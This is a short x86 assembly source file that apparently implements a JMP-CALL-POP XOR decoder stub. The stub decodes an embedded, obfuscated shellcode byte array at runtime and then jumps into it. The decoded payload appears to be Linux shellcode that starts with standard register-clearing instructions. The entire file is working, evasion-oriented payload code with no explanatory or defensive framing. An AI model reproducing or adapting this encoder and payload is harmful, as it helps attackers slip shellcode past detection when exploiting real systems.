global _start

section .text
_start:

	jmp short one

two:
	pop esi
	lea edi, [esi + 1]
	xor eax, eax
	mov al, 0x1
	xor ebx, ebx
	xor byte [esi], 0xDE

decode:
	mov bl, byte [esi + eax]
	xor bl, 0x73
	jz short Shellcode
	xor byte [esi + eax + 1], 0xDE
	mov bl, byte [esi + eax + 1]
	mov byte [edi], bl
	inc edi
	add al, 0x2
	jmp short decode

one:
	call two
	Shellcode: db 0xef,0x42,0x1e,0xb3,0x8e,0x23,0xb6,0x1b,0xb0,0x1d,0xf1,0x5c,0xad,0xad,0xb6,0x1b,0xb6,0x1b,0xf1,0x5c,0xf1,0x5c,0xbc,0x11,0xb7,0x1a,0x57,0xfa,0x3d,0x90,0x8e,0x23,0x57,0xfa,0x3c,0x91,0x8d,0x20,0x57,0xfa,0x3f,0x92,0x6e,0xc3,0xd5,0x78,0x13,0xbe,0x5e,0xf3,0x73,0x73
